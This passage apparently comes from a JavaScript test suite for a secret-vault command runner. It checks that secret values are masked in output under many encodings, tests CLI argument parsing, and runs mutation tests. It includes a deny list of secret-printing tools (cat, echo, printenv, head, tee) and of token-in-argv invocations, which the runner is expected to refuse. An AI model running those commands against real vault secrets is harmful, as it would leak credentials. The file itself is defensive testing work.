        if (got !== whole) { bad.push([name, pos, `cut at ${c - at}`, JSON.stringify(got).slice(0, 160)]); break; }
      }
    }
  }
  ok(!bad.length, `${PRINTS.length} printings × the 21-character value × start / middle / end of a 200-character chunk: each masked WHOLE (the placeholder where the printing was, only its quotes / prefix beside it, 0 characters of the value), and the stream cut at every point inside the printed value (${legs} cuts) hands on exactly the one-shot`, bad.slice(0, 4));
  const frag = V21.slice(0, 7), fragText = `a ${frag} b ${V21.slice(-4)} c`;
  ok(V.maskText(fragText, secretsOf(V21)) === fragText && Buffer.byteLength(frag) === V.MIN_MASK_BYTES - 1, `THE FLOOR (by rule): a 7-byte fragment of a value (${V.MIN_MASK_BYTES - 1} bytes, under MIN_MASK_BYTES) and its last four characters are NOT masked — the scrubber masks a whole value in a spelling, never a part of one`);
  console.log(`  (the producers' table ran in ${Date.now() - t0} ms)`);
}

console.log('⑦ THE CLI\'S WORDS — parseRunArgs');
{
  const P = (a) => V.parseRunArgs(a);
  const r = P(['--env', `GH_TOKEN=${M1}`, '--env=MODE=a=b', '--file', 'KUBECONFIG=@kc.yaml', '--stdin', M2, '--allow-argv', '--on', 'mac', '--timeout', '600', '--', 'gh', '--version']);
  ok(r.ok && eq(r.req, { argv: ['gh', '--version'], env: [['GH_TOKEN', M1], ['MODE', 'a=b']], file: [['KUBECONFIG', '@kc.yaml']], stdin: M2, allowArgv: true, on: 'mac', timeoutSec: 600 }), 'every flag, --flag=value, a value with "=", then -- and the command (its own flags untouched)', r);
  ok(eq(P(['curl', '--env', 'x']).req.argv, ['curl', '--env', 'x']) && P(['curl']).req.timeoutSec === 120, 'the first word that is not a flag starts the command; the default timeout is 120 s');
  const R = [['--nope'], ['--env'], ['--env', 'NOEQ'], ['--env', '=v'], ['--stdin', M1, '--stdin', M2], ['--timeout', '0'], ['--timeout', '601'], ['--timeout', '1.5'], ['--allow-argv=yes'], ['--file']];
  const wrong = R.filter((a) => { const x = P(a); return x.ok || x.code !== 'bad_flag'; });
  ok(!wrong.length, `${R.length} malformed lines ⇒ bad_flag (an unknown flag, a missing value, no NAME=, --stdin twice, a timeout outside 1–600 s, a value on --allow-argv)`, wrong);
  ok(V.planOf({ ...P(['--env', `T=${M1}`, '--', 'curl', 'https://x.example']).req }).ok, 'the request planOf takes is the one parseRunArgs makes');
  ok(V.CMD_MAX === 4096 && V.TEMPLATE_MAX === 65536 && V.TIMEOUT_DEFAULT_S === 120 && V.TIMEOUT_MAX_S === 600 && V.OUTPUT_MAX_BYTES === 2 * 1024 * 1024 && V.ASK_TTL_MS === 60000 && V.MIN_MASK_BYTES === 8 && V.SCHEME === 'vault://', 'the bounds the door reads: the command ≤ 4 096 bytes, a template ≤ 64 KiB, 120 s by default and ≤ 600 s, 2 MiB of output, a 60 s card, 8 bytes the shortest value');
}

console.log('⑧ MUTANTS — patched copies of src/vault-run.js must go RED');
{
  const dir = scratchDir('vault-run-model');
  fs.mkdirSync(path.join(dir, 'src'), { recursive: true });
  for (const f of ['vault-inventory.js', 'vault-kinds.js', 'vault-blocked.js']) fs.copyFileSync(path.join(REPO, 'src', f), path.join(dir, 'src', f));
  const real = fs.readFileSync(SRC, 'utf8');
  const mutant = (name, from, to) => { const n = real.split(from).length - 1; const f = path.join(dir, 'src', `vault-run-${name}.js`); fs.writeFileSync(f, real.replace(from, to)); return { hit: n === 1, M: require(f) }; };
  const argvLeg = (Vm) => ['curl', 'gh', 'terraform'].filter((t) => Vm.planOf({ argv: [t, `--token=${M1}`] }).code !== 'argv_refused');
  const printLeg = (Vm) => ['cat', 'echo', 'printenv', 'head', 'tee'].filter((t) => Vm.planOf({ argv: [t, '$VAULT_FILE{mounts/m1/secretKey}'] }).code !== 'tool_prints_secrets');
  const LEGS = [
    ['the scrubber without base64', '\n    ...base64Forms(bytes),\n', '\n    ...[],\n', (Vm) => (Vm === V ? once('scrub', () => scrubLeaks(V)) : scrubLeaks(Vm)).filter(([, n]) => /base64|Basic/.test(n) && !/^wrap: /.test(n))],
    ['argv allowed by default', 'const argvOpen = !!allowArgv && !!(row && row.argvOnly);', 'const argvOpen = true;', argvLeg],
    ['a print-class tool not refused', 'const REFUSING = TOOL_ROWS;', "const REFUSING = TOOL_ROWS.filter((r) => r.cls !== 'print');", printLeg],
    ['a value split across chunks escaping (no window)', '  const W = maxLen - 1;\n', '  const W = 0;\n', (Vm) => (Vm === V ? once('chunk', () => chunkEscapes(V)) : chunkEscapes(Vm))],
    // lane vault-scrub-forms: each NEW form dropped ⇒ its printings leak; a view's held tail ignored ⇒ a value cut inside its escapes leaks
    ...[['utf16', ', ...utf16Forms(v)', ''], ['base32', ', ...base32Forms(bytes)', ''],
      ['qp', "re: /=(?:\\r?\\n|[0-9A-Fa-f]{2})/g", 're: /(?!)/g'], ['escape', "re: /\\\\(?:x[0-9A-Fa-f]{2}", 're: /(?!)\\\\(?:x[0-9A-Fa-f]{2}'],
      ['entity', "re: /&(?:#[0-9]{1,7};", 're: /(?!)&(?:#[0-9]{1,7};'], ['ansi', "re: /\\x1b(?:", 're: /(?!)\\x1b(?:'], ['wrap', 're: /[\\r\\n]/g', 're: /(?!)/g']]
      .map(([form, from, to]) => [`the scrubber without the ${form} form`, from, to, (Vm) => (Vm === V ? once('scrub', () => scrubLeaks(V)) : scrubLeaks(Vm)).filter(([, n]) => n.startsWith(form + ': '))]),
    ['a backslash run held whole', 'k = j + 2 * Math.floor((k - j) / 2);', 'k = j;', (Vm) => { const m = Vm.createMasker(secretsOf(VALUES[0])), n = m.push('\\'.repeat(65536)).length; return n >= 65536 - 2 * m.window - 12 ? [] : [['held', n]]; }],
    ['a view\'s held tail ignored', 'if (!final) { const len = r ? r.sk.length : end, ss = len - W;', 'if (false) { const len = r ? r.sk.length : end, ss = len - W;', (Vm) => (Vm === V ? once('chunk', () => chunkEscapes(V)).filter(([, n]) => READ_ROWS.some(([r]) => r === n)) : chunkEscapes(Vm, READ_ROWS))],
  ];
  for (const [name, from, to, leg] of LEGS) {
    const { hit, M } = mutant(name.replace(/\W+/g, '-'), from, to);
    const red = hit ? leg(M) : [];
    ok(hit && red.length > 0 && leg(V).length === 0, `MUTANT «${name}»: the patch hits once and the leg goes RED (${red.length} escapes) — the shipped module passes the same leg`, { hit, sample: red.slice(0, 2) });
  }
}

console.log(fail ? `\nFAILED (${pass} passed, ${fail} failed)` : `\nALL PASS (${pass})`);
process.exit(fail ? 1 : 0);
